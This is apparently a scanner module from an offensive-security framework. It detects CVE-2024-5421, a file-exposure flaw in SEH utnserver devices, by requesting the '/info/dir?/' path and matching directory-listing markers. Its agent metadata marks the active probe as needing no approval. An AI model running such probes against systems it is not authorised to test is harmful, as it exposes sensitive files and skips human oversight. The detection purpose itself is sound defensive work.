#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A vulnerability was identified in utnserver Pro, utnserver ProMAX, and INU-100 version 20."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'SEH utnserver Pro/ProMAX/INU-100 20.1.22 - File Exposure Detection',
        'description': 'A vulnerability was identified in utnserver Pro, utnserver ProMAX, and INU-100 version 20.1.22 and earlier, impacting the file handling functions. This flaw results in authenticated file disclosure, granting unauthorized access to sensitive files and directories. Although authentication is required, the vulnerability poses a significant risk of data exposure. This vulnerability is publicly disclosed and identified as CVE-2024-5421.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2024', 'utnserver', 'seh', 'exposure', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://cyberdanube.com/en/en-multiple-vulnerabilities-in-seh-untserver-pro/index.html',
            'https://seclists.org/fulldisclosure/2024/Jun/4',
            'https://nvd.nist.gov/vuln/detail/CVE-2024-5421',
        ],
        'cve': 'CVE-2024-5421',
    }

    def run(self):
        r = self.http_request(method="GET", path='/info/dir?/', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('/var/tmp</td>', 'File System Info', 'face="courier',)
        if (all(m in body for m in body_all)):
            self.set_info(
                severity='high',
                reason="SEH utnserver Pro/ProMAX/INU-100 20.1.22 - File Exposure detected",
                path='/info/dir?/',
            )
            return True
        return False

